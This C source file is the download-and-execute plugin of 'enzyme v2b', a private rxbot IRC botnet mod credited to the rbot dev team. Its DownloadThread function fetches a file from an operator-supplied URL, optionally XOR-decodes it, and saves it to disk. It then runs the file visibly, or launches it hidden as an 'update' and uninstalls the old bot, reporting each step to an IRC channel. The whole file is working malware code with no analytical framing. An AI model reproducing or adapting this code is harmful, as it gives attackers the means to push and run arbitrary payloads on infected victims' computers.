/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.26.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/



#include "../../headers/includes.h"
#include "../../headers/functions.h"
#include "../../headers/externs.h"

#ifndef NO_DOWNLOAD

// function for downloading files/updating
DWORD WINAPI DownloadThread(LPVOID param)
{
	char buffer[IRCLINE];
	DWORD r, d, start, total, speed;

	DOWNLOAD dl = *((DOWNLOAD *)param);
	DOWNLOAD *dls = (DOWNLOAD *)param;
	dls->gotinfo = TRUE;

	HANDLE fh = fInternetOpenUrl(ih, dl.url, NULL, 0, 0, 0);
	if (fh != NULL) {
		// open the file
		HANDLE f = CreateFile(dl.dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		// make sure that our file handle is valid
		if (f < (HANDLE)1) {
			sprintf(buffer,"nzm (download.plg) »»  Couldn't open file: %s.",dl.dest);
			if (!dl.silent) irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
			addlog(buffer);

			clearthread(dl.threadnum);

			ExitThread(0);;
		}

		total = 0;
		start = GetTickCount();

		char *fileTotBuff=(char *)malloc(512000);	//FIX ME: Only checks first 500 kb
		do {
			memset(buffer, 0, sizeof(buffer));
			fInternetReadFile(fh, buffer, sizeof(buffer), &r);
			if (dl.encrypted)
				Xorbuff(buffer,r);
			WriteFile(f, buffer, r, &d, NULL);

			if ((total) < 512000) {
				//We have free bytes...
				//512000-total
				unsigned int bytestocopy;
				bytestocopy=512000-total;
				if (bytestocopy>r)
					bytestocopy=r;
				memcpy(&fileTotBuff[total],buffer,bytestocopy);
			}
			total+=r;
			if (dl.filelen)
				if (total>dl.filelen)
					break; //er, we have a problem... filesize is too big.
			if (dl.update != 1)
				sprintf(threads[dl.threadnum].name, "nzm (download.plg) »»  File download: %s (%dKB transferred).", dl.url, total / 1024);
			else
				sprintf(threads[dl.threadnum].name, "nzm (download.plg) »»  Update: %s (%dKB transferred).", dl.url, total / 1024);
		} while (r > 0);

		BOOL goodfile=TRUE;

		if (dl.filelen) {
			if (total!=dl.filelen) {
				goodfile=FALSE;
				sprintf(buffer,"nzm (download.plg) »»  Filesize is incorrect: (%d != %d).", total, dl.filelen);
				irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
				addlog(buffer);
			}
		}
		speed = total / (((GetTickCount() - start) / 1000) + 1);
		CloseHandle(f);

		/* if (dl.expectedcrc) {
			unsigned long crc,crclength;
			sprintf(buffer,"crc32([%lu], [%d])\n",fileTotBuff,total);
			crclength=total;
			if (crclength>512000) crclength=512000;
			crc=crc32(fileTotBuff,crclength);
			if (crc!=dl.expectedcrc) {
				goodfile=FALSE;
				irc_privmsg(dl.sock,dl.chan,"CRC Failed!",dl.notice);
			}

		} */
		free(fileTotBuff);

		/*if (dl.expectedcrc) {
			unsigned long crc=crc32f(dl.dest);
			if (crc!=dl.expectedcrc) {
				goodfile=FALSE;
				sprintf(buffer,"nzm (download.plg) »»  CRC Failed (%d != %d).", crc, dl.expectedcrc);
				irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
				addlog(buffer);
			}
		}*/

		if (goodfile==FALSE)
			goto badfile;

		//download isn't an update
		if (dl.update != 1) {
			sprintf(buffer, "nzm (download.plg) »»  Downloaded %.1f KB to %s @ %.1f KB/sec.", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
			addlog(buffer);

			if (dl.run == 1) {
				fShellExecute(0, "open", dl.dest, NULL, NULL, SW_SHOW);
				if (!dl.silent) {
					sprintf(buffer,"nzm (download.plg) »»  Opened: %s.",dl.dest);
					irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
					addlog(buffer);
				}
			}

			if (dl.run == 2) {
				fShellExecute(0, "open", dl.dest, NULL, NULL, SW_SHOW);
				if (!dl.silent) {
					sprintf(buffer,".n.z.m. (download.p.l.g) .»».  Opened: %s. Now removing bot...",dl.dest);
					irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
					addlog(buffer);
				}
				Sleep(1000);
				fWSACleanup();
				uninstall();
				ExitProcess(EXIT_SUCCESS);
			}

		// download is an update
		} else {
			sprintf(buffer, "nzm (download.plg) »»  Downloaded %.1fKB to %s @ %.1fKB/sec. Updating.", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
			addlog(buffer);

			PROCESS_INFORMATION pinfo;
			STARTUPINFO sinfo;
			memset(&pinfo, 0, sizeof(pinfo));
			memset(&sinfo, 0, sizeof(sinfo));
			sinfo.lpTitle = "";
			sinfo.cb = sizeof(sinfo);
			sinfo.dwFlags = STARTF_USESHOWWINDOW;
			sinfo.wShowWindow = SW_HIDE;

			if (CreateProcess(NULL, dl.dest, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
				fWSACleanup();
				uninstall();
				ExitProcess(EXIT_SUCCESS);
			} else {
				sprintf(buffer,"nzm (download.plg) »»  Update failed: Error executing file: %s.",dl.dest);
				if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
				addlog(buffer);
			}
		}
	} else {
		sprintf(buffer,"nzm (download.plg) »»  Bad URL, or DNS Error: %s.",dl.url);
		if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
		addlog(buffer);
	}

	badfile:
	fInternetCloseHandle(fh);

	clearthread(dl.threadnum);

	ExitThread(0);
}

char *Xorbuff(char *buffer,int bufferLen)
{
	for (int i=0;i<bufferLen;i++)
		buffer[i]^=prefix;

	return (buffer);
}
#endif
